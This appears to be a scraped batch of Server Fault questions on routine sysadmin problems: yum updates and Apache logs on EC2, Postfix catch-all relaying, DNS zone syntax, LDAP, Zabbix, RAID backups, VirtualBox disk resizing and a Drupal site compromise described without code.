    Dep-Install libnghttp2-1.21.1-1.4.amzn1.x86_64                            @amzn-main
    Updated     libstdc++48-4.8.3-9.111.amzn1.x86_64                          @amzn-main
    Update                  4.8.5-11.135.amzn1.x86_64                         @amzn-main
    Updated     libtool-ltdl-2.4.2-20.4.8.3.31.amzn1.x86_64                   @amzn-main
    Update                   2.4.2-20.4.8.5.32.amzn1.x86_64                   @amzn-main
    Updated     mod24_ssl-1:2.4.25-1.68.amzn1.x86_64                          @amzn-updates
    Update                1:2.4.27-3.75.amzn1.x86_64                          @amzn-main
    Updated     mysql-config-5.5.56-1.17.amzn1.x86_64                         @amzn-updates
    Update                   5.5.57-1.18.amzn1.x86_64                         @amzn-main
    Updated     mysql56-5.6.36-1.25.amzn1.x86_64                              @amzn-updates
    Update              5.6.37-1.26.amzn1.x86_64                              @amzn-main
    Updated     mysql56-common-5.6.36-1.25.amzn1.x86_64                       @amzn-updates
    Update                     5.6.37-1.26.amzn1.x86_64                       @amzn-main
    Updated     mysql56-errmsg-5.6.36-1.25.amzn1.x86_64                       @amzn-updates
    Update                     5.6.37-1.26.amzn1.x86_64                       @amzn-main
    Updated     mysql56-libs-5.6.36-1.25.amzn1.x86_64                         @amzn-updates
    Update                   5.6.37-1.26.amzn1.x86_64                         @amzn-main
    Updated     mysql56-server-5.6.36-1.25.amzn1.x86_64                       @amzn-updates
    Update                     5.6.37-1.26.amzn1.x86_64                       @amzn-main
    Updated     nss-3.28.4-1.0.78.amzn1.x86_64                                @amzn-updates
    Update          3.28.4-12.80.amzn1.x86_64                                 @amzn-updates
    Dep-Install nss-pem-1.0.3-4.3.amzn1.x86_64                                @amzn-updates
    Updated     nss-softokn-3.16.2.3-14.4.39.amzn1.x86_64                     @amzn-updates
    Update                  3.28.3-8.41.amzn1.x86_64                          @amzn-updates
    Updated     nss-softokn-freebl-3.16.2.3-14.4.39.amzn1.x86_64              @amzn-updates
    Update                         3.28.3-8.41.amzn1.x86_64                   @amzn-updates
    Updated     nss-sysinit-3.28.4-1.0.78.amzn1.x86_64                        @amzn-updates
    Update                  3.28.4-12.80.amzn1.x86_64                         @amzn-updates
    Updated     nss-tools-3.28.4-1.0.78.amzn1.x86_64                          @amzn-updates
    Update                3.28.4-12.80.amzn1.x86_64                           @amzn-updates
    Updated     nss-util-3.28.4-1.0.52.amzn1.x86_64                           @amzn-updates
    Update               3.28.4-3.53.amzn1.x86_64                             @amzn-updates
    Updated     openssh-6.6.1p1-33.66.amzn1.x86_64                            @amzn-main
    Update              7.4p1-11.68.amzn1.x86_64                              @amzn-main
    Updated     openssh-clients-6.6.1p1-33.66.amzn1.x86_64                    @amzn-main
    Update                      7.4p1-11.68.amzn1.x86_64                      @amzn-main
    Updated     openssh-server-6.6.1p1-33.66.amzn1.x86_64                     @amzn-main
    Update                     7.4p1-11.68.amzn1.x86_64                       @amzn-main
    Updated     openssl-1:1.0.1k-15.99.amzn1.x86_64                           @amzn-main
    Update              1:1.0.2k-7.103.amzn1.x86_64                           @amzn-main
    Install     php56-5.6.31-1.134.amzn1.x86_64                               @amzn-main
    Dep-Install php56-cli-5.6.31-1.134.amzn1.x86_64                           @amzn-main
    Dep-Install php56-common-5.6.31-1.134.amzn1.x86_64                        @amzn-main
    Install     php56-gd-5.6.31-1.134.amzn1.x86_64                            @amzn-main
    Dep-Install php56-jsonc-1.3.10-1.20.amzn1.x86_64                          @amzn-updates
    Install     php56-pdo-5.6.31-1.134.amzn1.x86_64                           @amzn-main
    Dep-Install php56-process-5.6.31-1.134.amzn1.x86_64                       @amzn-main
    Install     php56-xml-5.6.31-1.134.amzn1.x86_64                           @amzn-main
    Updated     php70-7.0.16-1.21.amzn1.x86_64                                @amzn-main
    Update            7.0.21-1.24.amzn1.x86_64                                @amzn-main
    Updated     php70-cli-7.0.16-1.21.amzn1.x86_64                            @amzn-main
    Update                7.0.21-1.24.amzn1.x86_64                            @amzn-main
    Updated     php70-common-7.0.16-1.21.amzn1.x86_64                         @amzn-main
    Update                   7.0.21-1.24.amzn1.x86_64                         @amzn-main
    Updated     php70-gd-7.0.16-1.21.amzn1.x86_64                             @amzn-main
    Update               7.0.21-1.24.amzn1.x86_64                             @amzn-main
    Updated     php70-json-7.0.16-1.21.amzn1.x86_64                           @amzn-main
    Update                 7.0.21-1.24.amzn1.x86_64                           @amzn-main
    Updated     php70-mbstring-7.0.16-1.21.amzn1.x86_64                       @amzn-main
    Update                     7.0.21-1.24.amzn1.x86_64                       @amzn-main
    Updated     php70-mysqlnd-7.0.16-1.21.amzn1.x86_64                        @amzn-main
    Update                    7.0.21-1.24.amzn1.x86_64                        @amzn-main
    Updated     php70-opcache-7.0.16-1.21.amzn1.x86_64                        @amzn-main
    Update                    7.0.21-1.24.amzn1.x86_64                        @amzn-main
    Updated     php70-pdo-7.0.16-1.21.amzn1.x86_64                            @amzn-main
    Update                7.0.21-1.24.amzn1.x86_64                            @amzn-main
    Updated     php70-process-7.0.16-1.21.amzn1.x86_64                        @amzn-main
    Update                    7.0.21-1.24.amzn1.x86_64                        @amzn-main
    Updated     php70-xml-7.0.16-1.21.amzn1.x86_64                            @amzn-main
    Update                7.0.21-1.24.amzn1.x86_64                            @amzn-main
    Updated     python26-botocore-1.5.46-1.63.amzn1.noarch                    @amzn-updates
    Update                        1.5.95-1.65.amzn1.noarch                    @amzn-main
    Updated     python26-setuptools-12.2-1.32.amzn1.noarch                    @amzn-main
    Update                          36.2.7-1.33.amzn1.noarch                  @amzn-main
    Updated     python27-botocore-1.5.46-1.63.amzn1.noarch                    @amzn-updates
    Update                        1.5.95-1.65.amzn1.noarch                    @amzn-main
    Updated     python27-setuptools-12.2-1.32.amzn1.noarch                    @amzn-main
    Update                          36.2.7-1.33.amzn1.noarch                  @amzn-main
    Updated     sqlite-3.7.17-6.13.amzn1.x86_64                               @amzn-updates
    Update             3.7.17-8.14.amzn1.x86_64                               @amzn-main
    Updated     sudo-1.8.6p3-25.23.amzn1.x86_64                               ?
    Update           1.8.6p3-29.27.amzn1.x86_64                               @amzn-main
    Updated     system-release-2017.03-0.0.noarch                             @amzn-main
    Update                     2017.09-0.0.noarch                             @amzn-main
    Updated     wget-1.18-1.18.amzn1.x86_64                                   @amzn-updates
    Update           1.18-3.28.amzn1.x86_64                                   @amzn-updates
    Updated     yum-3.4.3-150.68.amzn1.noarch                                 @amzn-main
    Update          3.4.3-150.70.amzn1.noarch                                 @amzn-main
    Updated     yum-python26-3.4.3-150.68.amzn1.noarch                        @amzn-main
    Update                   3.4.3-150.70.amzn1.noarch                        @amzn-main
Scriptlet output:
   1 warning: /etc/nsswitch.conf created as /etc/nsswitch.conf.rpmnew
   2 warning: /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.35.amzn1.x86_64/jre/lib/security/java.security created as /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.35.amzn1.x86_64/jre/lib/security/java.security.rpmnew
   3 warning: /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.35.amzn1.x86_64/jre/lib/security/nss.cfg created as /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.35.amzn1.x86_64/jre/lib/security/nss.cfg.rpmnew
   4 warning: /etc/issue.net created as /etc/issue.net.rpmnew
   5 warning: /etc/sysctl.conf created as /etc/sysctl.conf.rpmnew
   6 warning: /etc/ssh/sshd_config created as /etc/ssh/sshd_config.rpmnew
   7 warning: /etc/httpd/conf.d/ssl.conf created as /etc/httpd/conf.d/ssl.conf.rpmnew
   8 Stopping Datadog Agent (using killproc on supervisord): [  OK  ]
   9 warning: file /lib/modules/4.9.20-10.30.amzn1.x86_64/modules.order: remove failed: No such file or directory
  10 warning: file /lib/modules/4.9.20-10.30.amzn1.x86_64/modules.networking: remove failed: No such file or directory
  11 warning: file /lib/modules/4.9.20-10.30.amzn1.x86_64/modules.modesetting: remove failed: No such file or directory
  12 warning: file /lib/modules/4.9.20-10.30.amzn1.x86_64/modules.drm: remove failed: No such file or directory
  13 warning: file /lib/modules/4.9.20-10.30.amzn1.x86_64/modules.builtin: remove failed: No such file or directory
  14 warning: file /lib/modules/4.9.20-10.30.amzn1.x86_64/modules.block: remove failed: No such file or directory
  15 warning: /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-2.b11.30.amzn1.x86_64/jre/lib/security/java.security saved as /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-2.b11.30.amzn1.x86_64/jre/lib/security/java.security.rpmsave
  16 (Re)starting datadog-agent now...
  17 Stopping Datadog Agent (using killproc on supervisord): [FAILED]
  18 Starting Datadog Agent (using supervisord):[  OK  ]
history info
</code></pre>

<p><strong>/etc/httpd/logs/error_log</strong></p>

<pre><code>[Fri Nov 03 00:28:47.152945 2017] [mpm_worker:notice] [pid 2772:tid 139963340687424] AH00295: caught SIGTERM, shutting down
[Fri Nov 03 00:28:47.971191 2017] [suexec:notice] [pid 3238:tid 139837959862336] AH01232: suEXEC mechanism enabled (wrapper: /usr/sbin/suexec)
[Fri Nov 03 00:28:47.992314 2017] [lbmethod_heartbeat:notice] [pid 3239:tid 139837959862336] AH02282: No slotmem from mod_heartmonitor
[Fri Nov 03 00:28:48.008075 2017] [mpm_worker:notice] [pid 3239:tid 139837959862336] AH00292: Apache/2.4.27 (Amazon) OpenSSL/1.0.2k-fips PHP/5.6.31 configured -- resuming normal operations
[Fri Nov 03 00:28:48.008099 2017] [core:notice] [pid 3239:tid 139837959862336] AH00094: Command line: '/usr/sbin/httpd'
[Fri Nov 03 00:28:52.012474 2017] [mpm_worker:error] [pid 3239:tid 139837959862336] AH00287: server is within MinSpareThreads of MaxRequestWorkers, consider raising the MaxRequestWorkers setting
</code></pre>

<p><strong>ps -ef</strong></p>

<pre><code>UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 00:26 ?        00:00:00 /sbin/init
root         2     0  0 00:26 ?        00:00:00 [kthreadd]
root         3     2  0 00:26 ?        00:00:00 [ksoftirqd/0]
root         4     2  0 00:26 ?        00:00:00 [kworker/0:0]
root         5     2  0 00:26 ?        00:00:00 [kworker/0:0H]
root         7     2  0 00:26 ?        00:00:00 [rcu_sched]
root         8     2  0 00:26 ?        00:00:00 [rcu_bh]
root         9     2  0 00:26 ?        00:00:00 [migration/0]
root        10     2  0 00:26 ?        00:00:00 [lru-add-drain]
root        11     2  0 00:26 ?        00:00:00 [cpuhp/0]
root        12     2  0 00:26 ?        00:00:00 [cpuhp/1]
root        13     2  0 00:26 ?        00:00:00 [migration/1]
root        14     2  0 00:26 ?        00:00:00 [ksoftirqd/1]
root        15     2  0 00:26 ?        00:00:00 [kworker/1:0]
root        16     2  0 00:26 ?        00:00:00 [kworker/1:0H]
root        17     2  0 00:26 ?        00:00:00 [kdevtmpfs]
root        18     2  0 00:26 ?        00:00:00 [netns]
root        19     2  0 00:26 ?        00:00:00 [kworker/u30:1]
root        23     2  0 00:26 ?        00:00:00 [kworker/u30:2]
root        25     2  0 00:26 ?        00:00:00 [xenwatch]
root        26     2  0 00:26 ?        00:00:00 [xenbus]
root        27     2  0 00:26 ?        00:00:00 [kworker/0:1]
root       149     2  0 00:26 ?        00:00:00 [khungtaskd]
root       150     2  0 00:26 ?        00:00:00 [oom_reaper]
root       151     2  0 00:26 ?        00:00:00 [writeback]
root       153     2  0 00:26 ?        00:00:00 [kcompactd0]
root       154     2  0 00:26 ?        00:00:00 [ksmd]
root       155     2  0 00:26 ?        00:00:00 [khugepaged]
root       156     2  0 00:26 ?        00:00:00 [crypto]
root       157     2  0 00:26 ?        00:00:00 [kintegrityd]
root       158     2  0 00:26 ?        00:00:00 [bioset]
root       160     2  0 00:26 ?        00:00:00 [kblockd]
root       510     2  0 00:26 ?        00:00:00 [md]
root       515     2  0 00:26 ?        00:00:00 [kworker/1:1]
root       641     2  0 00:26 ?        00:00:00 [kswapd0]
root       642     2  0 00:26 ?        00:00:00 [vmstat]
root       739     2  0 00:26 ?        00:00:00 [kthrotld]
root       791     2  0 00:26 ?        00:00:00 [bioset]
root      1472     2  0 00:26 ?        00:00:00 [ata_sff]
root      1485     2  0 00:26 ?        00:00:00 [scsi_eh_0]
root      1486     2  0 00:26 ?        00:00:00 [scsi_tmf_0]
root      1489     2  0 00:26 ?        00:00:00 [scsi_eh_1]
root      1490     2  0 00:26 ?        00:00:00 [scsi_tmf_1]
root      1544     2  0 00:26 ?        00:00:00 [jbd2/xvda1-8]
root      1545     2  0 00:26 ?        00:00:00 [ext4-rsv-conver]
root      1573     2  0 00:26 ?        00:00:00 [kworker/1:1H]
root      1591     1  0 00:26 ?        00:00:00 /sbin/udevd -d
root      1723  1591  0 00:26 ?        00:00:00 /sbin/udevd -d
root      1724  1591  0 00:26 ?        00:00:00 /sbin/udevd -d
root      1897     2  0 00:26 ?        00:00:00 [kworker/0:1H]
root      1906     2  0 00:26 ?        00:00:00 [kauditd]
root      1922     1  0 00:26 ?        00:00:00 lvmetad
root      1931     1  0 00:26 ?        00:00:00 lvmpolld
root      1987     2  0 00:26 ?        00:00:00 [ipv6_addrconf]
root      2138     1  0 00:26 ?        00:00:00 /sbin/dhclient -q -lf /var/lib/dhclient/dhclient-eth0.leases -pf /var/run/dhclient-eth0.pid eth0
root      2194     1  0 00:26 ?        00:00:00 auditd
root      2221     1  0 00:26 ?        00:00:00 /sbin/rsyslogd -i /var/run/syslogd.pid -c 5
root      2235     1  0 00:26 ?        00:00:00 irqbalance --pid=/var/run/irqbalance.pid --hintpolicy=subset
dbus      2251     1  0 00:26 ?        00:00:00 dbus-daemon --system
root      2286     1  0 00:26 ?        00:00:00 /usr/sbin/acpid
root      2386     1  0 00:26 ?        00:00:00 /usr/sbin/sshd
ntp       2408     1  0 00:26 ?        00:00:00 ntpd -u ntp:ntp -p /var/run/ntpd.pid -g
root      2487     1  0 00:26 ?        00:00:00 /bin/sh /usr/libexec/mysql56/mysqld_safe --datadir=/var/lib/mysql --socket=/var/lib/mysql/mysql.sock --pid-file=/var/run/mysqld/mysqld.pid --basedi
mysql     2701  2487  0 00:26 ?        00:00:00 /usr/libexec/mysql56/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql56/plugin --user=mysql --log-error=/var/log/mysqld
root      2748     1  0 00:26 ?        00:00:00 sendmail: accepting connections
smmsp     2757     1  0 00:26 ?        00:00:00 sendmail: Queue runner@01:00:00 for /var/spool/clientmqueue
root      2784     1  0 00:26 ?        00:00:00 crond
root      2798     1  0 00:26 ?        00:00:00 /usr/sbin/atd
dd-agent  2862     1  0 00:26 ?        00:00:00 /opt/datadog-agent/embedded/bin/python /opt/datadog-agent/bin/supervisord -c /etc/dd-agent/supervisor.conf
dd-agent  2867  2862  0 00:26 ?        00:00:00 /opt/datadog-agent/bin/trace-agent
dd-agent  2868  2862  0 00:26 ?        00:00:02 /opt/datadog-agent/embedded/bin/python /opt/datadog-agent/agent/ddagent.py
dd-agent  2869  2862  0 00:26 ?        00:00:01 /opt/datadog-agent/embedded/bin/python /opt/datadog-agent/agent/dogstatsd.py --use-local-forwarder
dd-agent  2872  2862  0 00:26 ?        00:00:02 /opt/datadog-agent/embedded/bin/python /opt/datadog-agent/agent/agent.py foreground --use-local-forwarder
root      3011     1  0 00:26 tty1     00:00:00 /sbin/mingetty /dev/tty1
root      3014     1  0 00:26 ttyS0    00:00:00 /sbin/agetty ttyS0 9600 vt100-nav
root      3016     1  0 00:26 tty2     00:00:00 /sbin/mingetty /dev/tty2
root      3020     1  0 00:26 tty3     00:00:00 /sbin/mingetty /dev/tty3
root      3022     1  0 00:26 tty4     00:00:00 /sbin/mingetty /dev/tty4
root      3024     1  0 00:26 tty5     00:00:00 /sbin/mingetty /dev/tty5
root      3026     1  0 00:26 tty6     00:00:00 /sbin/mingetty /dev/tty6
root      3069  2386  0 00:27 ?        00:00:00 sshd: ec2-user [priv]
ec2-user  3071  3069  0 00:27 ?        00:00:00 sshd: ec2-user@pts/0
ec2-user  3072  3071  0 00:27 pts/0    00:00:00 -bash
root      3239     1  0 00:28 ?        00:00:00 /usr/sbin/httpd
apache    3241  3239  0 00:28 ?        00:00:00 /usr/sbin/httpd
root      3788  2386  0 00:37 ?        00:00:00 sshd: ec2-user [priv]
ec2-user  3790  3788  0 00:37 ?        00:00:00 sshd: ec2-user@notty
ec2-user  3791  3790  0 00:37 ?        00:00:00 /usr/libexec/openssh/sftp-server
apache    4456  3239  0 00:47 ?        00:00:00 /usr/sbin/httpd
ec2-user  4509  3072  0 00:48 pts/0    00:00:00 ps -ef
</code></pre>
","<amazon-ec2><apache-2.4><yum><500-error>","2017-11-03 04:59:43"
"881643","Can I disconnect the upstream port of an ethernet switch to create a local network without Internet?","<p>I have two computers connected to an ethernet switch. The switch is connected to my ISP router for internet access, through the switch upstream port (of course). What happens if I unplug the upstream port?</p>

<p>My goal is simple: I want to have a local LAN <em>without</em> Internet access, but I still want to be able for my two machines to talk to each other thorough TCP. Is it possible or once I disconnect the upstream port my network is dead? Does it depend on the switch?</p>

<p>I'm buying a cheap 1000 Mbps switch for $15 at Amazon.</p>
","<switch><tcp><ethernet>","2017-11-03 08:36:35"
"881777","Is it possible to create a catch-all email using postfix which accepts any email address and sends an email to an external address?","<p>Some background and my challenge:</p>

<p><strong>Background</strong></p>

<p>I am using Magento 2.x using a virtual machine set-up which runs on Ubuntu 16.04</p>

<p><strong>Challenge</strong></p>

<p>My goal is to be able to test emails sent to me from the Magento application.  In an ideal situation, I would not use an extension or third-party service (although a third-party SMTP server on the linux box could work).  </p>

<p>To achieve my goal, I need to be able to register as a customer in the Magento application with <em>any</em> email address (fake or real) and have the email sent to the same external email address, no matter what.</p>

<p><strong>What I've done so far</strong></p>

<ol>
<li>I've installed postfix</li>
<li>I've installed Magento using <code>luma.com</code> as the domain (and set up my hosts file accordingly on my host machine, etc.)</li>
<li>I've created a linux user account called ""contact""</li>
<li>I've configured <code>inet_interfaces</code> in <code>/etc/postfix/main.cf</code> as <code>loopback-only</code></li>
<li>I've set <code>mydestination</code> to <code>$myhostname, localhost.$mydomain, $mydomain</code></li>
<li>I've configured Magento to send its store emails from <code>contact@luma.com</code></li>
<li><p>I've set up an aliases file as the following:</p>

<pre><code>postmaster:    root
root:          contact
contact:       me@gmail.com
</code></pre></li>
</ol>

<p>Then I ran <code>newaliases</code> As far as I recall, email sends fine with this setup.  Hooray!</p>

<p>Next, the catch-all part.  For this, I've tried loads of things, and none seem to work.  From the reading I've done, I've tried the following:</p>

<p>In <code>/etc/postfix/main.cf</code>, I added the following:</p>

<pre><code>    virtual_alias_domains = luma.com
    virtual_alias_maps = hash:/etc/postfix/virtual
</code></pre>

<p>Next, in <code>/etc/postfix/virtual</code>, I encountered my first problem.  As far as I understand from the reading I've done, I'm supposed to use something like:</p>

<pre><code>    @example.com   contact
</code></pre>

<p>This step apparently ensures that any email sent via postfix (e.g. from the Magento application) which uses an <code>@example.com</code> email address would be routed to the <code>contact</code> linux user I created above.  Then, my thinking was that the system would use the alias I set up to ultimately send out that email from <code>contact@luma.com</code> (via the settings in Magento) through to the external address I set up in the aliases file.  This approach would theoretically allow a user to register for an account with Magento using, say, <code>joe@example.com</code>, and then send the associated Welcome email to my external email address.</p>

<p>The issue with this is that I need the system to do this for <em>any</em> email, not just for emails ending in <code>@example.com</code></p>

<p>Just for sake of completeness, I'll say that before asking this question, I was most recently researching how to achieve this part of the challenge using pcre tables. I've also tried configuring something using <code>luser_relay</code>, but both of these things are over my head at this point, so I'm lost.</p>

<p>My hope is that someone can offer some guidance as to whether I'm on the right path, where I may have missed something, and ultimately, offer some advice on whether my challenge can be solved and how I might go about solving it.</p>

<p>NOTE: I originally posted this over at stackoverflow but was advised to post it here.  Hopefully this is acceptable. Thanks for reading.</p>
","<linux><email><postfix><magento>","2017-11-04 02:22:26"
"881782","Removing the content of a directory recursively","<p>I want to delete the content of a folder without deleting a folder: all files and all sub folders with sub files. This doesn't delete anything</p>

<pre><code>sudo rm -rf /folder1/*
</code></pre>

<p>Why not? How to get it to work?</p>
","<directory>","2017-11-04 05:08:21"
"881810","What is keyword IN for in DNS zone files","<p>Typical DNS zone files contain records like this:</p>

<pre><code>something   IN      A               1.2.3.4
xxxxx       IN      A               2.3.4.5
kkkkk       IN      A               8.2.1.2
</code></pre>

<p>What is the <strong>IN</strong> for? And why it works even if it's not there?</p>

<p>P.S. yes I did google this, but believe or not googling ""in"" is not fun.</p>
","<bind>","2017-11-04 11:22:48"
"881877","SSH using LDAP credentials is showing perimission denied (public key)","<p>I have 2 machines (LDAP Server and LDAP Client) I am learning to configure LDAP Server and I am following the  <a href=""https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-openldap-and-phpldapadmin-on-ubuntu-16-04"" rel=""nofollow noreferrer"">digital ocean tutorial</a>. phpldapdmin is working fine and I have configured the client also. But when I try to log in to the client using the LDAP user, I get permission denied (public key). Can someone kindly help me with this.</p>
","<linux><ldap><linux-networking><openldap><ubuntu-16.04>","2017-11-04 23:17:06"
"881931","HP Proliant DL360 G6 Sensor #27 Storage Zone","<p>I have two HP Proliant DL360 G6 Servers where ilo shows me high temperatures for Sensor 27 (Storage Zone). The Values are 59-63 Degrees. 
All other sensorvalues are clearly lower.
Does anybody knows where the Sensor 27 is located?</p>

<p>Thanks</p>
","<hp>","2017-11-05 13:08:05"
"882029","How to correctly configure PHP settings on Zabbix installation?","<p>I'm currently installing <a href=""https://www.zabbix.com/documentation/2.0/manual/introduction/about"" rel=""nofollow noreferrer"">Zabbix</a> on RedHat Enterprise Linux 7. I'm stuck at PHP configuration. <a href=""https://www.zabbix.com/documentation/3.4/manual/installation/install_from_packages/rhel_centos#zabbix_frontend_and_server_on_rhel_6"" rel=""nofollow noreferrer"">Here</a> you can see all PHP configurations required for Zabbix. Running <code>cat /etc/httpd/conf.d/zabbix.conf</code> I discovered all configurations are OK. But when I enter <code>http://myServerIP/zabbix</code> I get errors about PHP configurations not as required. As example, it says</p>

<p>Minimum required size of PHP post is 16M (configuration option ""post_max_size"").</p>

<p>But when I ran <code>cat /etc/httpd/conf.d/zabbix.conf | grep 'post_max_size'</code> I get 16M. Is there any visible step that I maybe skipped? I already restarted httpd service, so I don't know why this is not working</p>
","<rhel7><zabbix-agent>","2017-11-06 11:19:16"
"882299","Raid 1 backup or backup of backup","<p>I recently upgraded(because of fear of failure) my back up drive from a 750GB Toshiba Canvio USB3 drive(couple of years old) to a WD My Book Duo 6TB USB3 drive. I configured WD My Book Duo as Raid 1 for redundancy.
These are the benchmark numbers I got using CrystalDiskMark. </p>

<p>WD My Book Duo 2x3TB in Raid 1 configuration</p>

<pre><code>-----------------------------------------------------------------------
CrystalDiskMark 6.0.0 x64 (C) 2007-2017 hiyohiyo
                          Crystal Dew World : https://crystalmark.info/
-----------------------------------------------------------------------
* MB/s = 1,000,000 bytes/s [SATA/600 = 600,000,000 bytes/s]
* KB = 1000 bytes, KiB = 1024 bytes

   Sequential Read (Q= 32,T= 1) :   154.008 MB/s
  Sequential Write (Q= 32,T= 1) :   154.307 MB/s
  Random Read 4KiB (Q=  8,T= 8) :     0.618 MB/s [    150.9 IOPS]
 Random Write 4KiB (Q=  8,T= 8) :     1.448 MB/s [    353.5 IOPS]
  Random Read 4KiB (Q= 32,T= 1) :     0.595 MB/s [    145.3 IOPS]
 Random Write 4KiB (Q= 32,T= 1) :     1.512 MB/s [    369.1 IOPS]
  Random Read 4KiB (Q=  1,T= 1) :     0.562 MB/s [    137.2 IOPS]
 Random Write 4KiB (Q=  1,T= 1) :     1.435 MB/s [    350.3 IOPS]

  Test : 1024 MiB [D: 1.0% (26.6/2794.4 GiB)] (x5)  [Interval=5 sec]
  Date : 2017/11/07 10:16:56
    OS : Windows 7 Enterprise SP1 [6.1 Build 7601] (x64)
</code></pre>

<p>Toshiba Canvio 750GB</p>

<pre><code>-----------------------------------------------------------------------
CrystalDiskMark 6.0.0 x64 (C) 2007-2017 hiyohiyo
                          Crystal Dew World : https://crystalmark.info/
-----------------------------------------------------------------------
* MB/s = 1,000,000 bytes/s [SATA/600 = 600,000,000 bytes/s]
* KB = 1000 bytes, KiB = 1024 bytes

   Sequential Read (Q= 32,T= 1) :    12.058 MB/s
  Sequential Write (Q= 32,T= 1) :    96.205 MB/s
  Random Read 4KiB (Q=  8,T= 8) :     0.403 MB/s [     98.4 IOPS]
 Random Write 4KiB (Q=  8,T= 8) :     1.108 MB/s [    270.5 IOPS]
  Random Read 4KiB (Q= 32,T= 1) :     0.320 MB/s [     78.1 IOPS]
 Random Write 4KiB (Q= 32,T= 1) :     1.055 MB/s [    257.6 IOPS]
  Random Read 4KiB (Q=  1,T= 1) :     0.263 MB/s [     64.2 IOPS]
 Random Write 4KiB (Q=  1,T= 1) :     1.126 MB/s [    274.9 IOPS]

  Test : 1024 MiB [E: 25.7% (179.8/698.6 GiB)] (x5)  [Interval=5 sec]
  Date : 2017/11/07 11:10:22
    OS : Windows 7 Enterprise SP1 [6.1 Build 7601] (x64)
</code></pre>

<ol>
<li>In sequential RW performance WD (even in Raid 1) is way better compared to Toshiba. However when I tried copying around 4GB of photos ~4000 files Toshiba was more than twice faster(~2minutes completion) compared to WD(~5minutes completion). Is this normal? Is the Raid 1 overhead of WD cause of this performance drop?</li>
<li>How do I read data from the hard drive without using WD controller(The box)? i.e by plugging the drive directly into the SATA port of my computer. Is there WD software which can help me recover it? </li>
<li>Should I go for a backup of backup instead of using Raid 1 backup since real world performance of my Raid 1 setup seems to be low? </li>
</ol>
","<backup><raid><hardware-raid><raid1>","2017-11-07 16:29:48"
"882446","VirtualBox guest OS doesn't expand after resizing VDI file","<p>My host OS is OS X El Capitan.  My guest OS, OpenBSD 6.1, ran out of disk space, so I ran <code>VBoxManage modifymedium disk OpenBSD\ 6.1.vdi --resize 15000</code> to resize my VDI from 4GB to 15GB. However my guest OS isn't using the additional space to expand:</p>

<pre><code>[me@puffy:~]$df -lh
Filesystem     Size    Used   Avail Capacity  Mounted on
/dev/wd0a      907M    378M    484M    44%    /
/dev/wd0e      491M    467M   36.0K   100%    /home
/dev/wd0d      2.7G    2.6G   -6.7M   100%    /usr
</code></pre>

<p>I tried forcing it to grow by running</p>

<pre><code>[me@puffy:~]$doas -uroot sh -c 'yes &gt; /yesfile'

/: write failed, file system is full
</code></pre>

<p>but it ran out of disk space almost immediately.</p>
","<virtualbox><openbsd>","2017-11-08 11:48:44"
"882769","Creating an installer package file like .MSI for Linux using Chef","<p>We are building an analytic application. As a part of final deployment we are planning to install the application using an installer tool.Need to create an  installer package like MSI for installing the application using Chef.I hardly find time to learn about the Chef.It would be better if there are any link that can guide me through the process of building an installer package file like MSI.</p>
","<chef>","2017-11-10 01:58:54"
"811432","Moving from internal raid to nas for video editing","<p>I've got a two drive raid 0 in my main desktop for 9tb of usable storage. I actively use premiere pro and the adobe suite to produce videos that I am paid for and I do web development.</p>

<p>I backup to cold stored hard drives pretty frequently and have about 20 tb of data stored that way.</p>

<p>I'm thinking about moving to a nas for these reasons.</p>

<p>1) I could have a 4 drive Raid 5 accessible from the network for my main machine</p>

<p>2) I could access that from other machines in the office.</p>

<p>3) I could have access via wifi from my laptop</p>

<p>4) I could free up space in my main desktop and move to ssds for all of my desktop needs, 1 to hold assets, 1 to hold working files, 1 for exporting.</p>

<p>5) The NAS could act as a plex server to serve video to our tvs and media players</p>

<p>I'm thinking of going to the synology 916+ for the fact that I have synology servers in other locations for clients and they work well and are reliable. Plus they have some other features that would be handy, like video surveillance server and asterisk server. </p>

<p>Does anyone see any problems with this? Am I going to run in to trouble with editing this way that I'm not seeing? I have 10 4tb drives that I use for cold storage that I would continue to back up to in addition to this server but the server would hold files that I am using actively and then also allow me to back up my desktop and workstations actively without really thinking about it.</p>

<p>Thanks</p>
","<network-attached-storage><windows-10><synology>","2016-10-26 14:26:24"
"883179","Site hacked, need help to look for clues about how it happened","<p>i recognized a successful hacking attempt where someone managed somehow to modify a file under my drupal installation and to inject javascript code</p>

<p>the file that was hacked was :jquery-1.9.1.min.js which is a general javascript library file that i downloaded earlier (clean with no hacking code)</p>

<p>i cleaned the file now but i want to know how the person got in?</p>

<p>and also another very strange thing , the last modified date of the file was intact since years even though the code was added to the file recently, can someone hack the site then change the last modified date as well to cover their tracks?</p>

<p>My question in simple words, where do i start looking to find clues to find the security hole?</p>
","<hacking><drupal>","2017-11-13 12:07:19"
"811488","Is there a way to see free mem history on redhat?","<p>Is there a built-in way of checking free mem history or any other performance stat on redhat 6.5--e.g., the past hour, days, weeks etc..</p>

<p>On other systems, I have previously used orca which creates logs of performance stats.</p>

<p>If there is no built-in, is there a recommended way of doing it.</p>
","<redhat><unix>","2016-10-26 18:51:31"
"747372","How to know the current script FullName","<p>My script call many other script and i need know each fullname (for log info).</p>

<p>but the same command doesn't work in Powershell_ISE</p>
","<powershell><path>","2016-01-07 13:30:26"
"747445","Why didn't Windows create a User_Data folder for a new profile?","<p>Normally the User_Data folder is created automatically when the new user logs into their profile. Where/how can I check what's preventing this?</p>
","<windows><users><profile>","2016-01-07 17:05:24"
"883424","Changing the name of a YUM repository (or aliasing it)?","<p>I'm trying to install Vesta panel on Amazon Red Hat AMI.</p>

<p>At <a href=""https://github.com/serghey-rodin/vesta/blob/master/install/vst-install-rhel.sh#L616"" rel=""nofollow noreferrer"">some point of install script</a> Vesta try to install its software:</p>

<pre><code>yum -y --disablerepo=* --enablerepo=""*base,*updates,nginx,epel,vesta"" \
        install $software
</code></pre>

<p>... disabling all repository and enabling some like <code>*base</code> and <code>*updates</code>.</p>

<p>My AMI repositories are:</p>

<pre><code>*epel/x86_64 Extra Packages for Enterprise Linux 7 - x86_64
nginx/x86_64 nginx repo
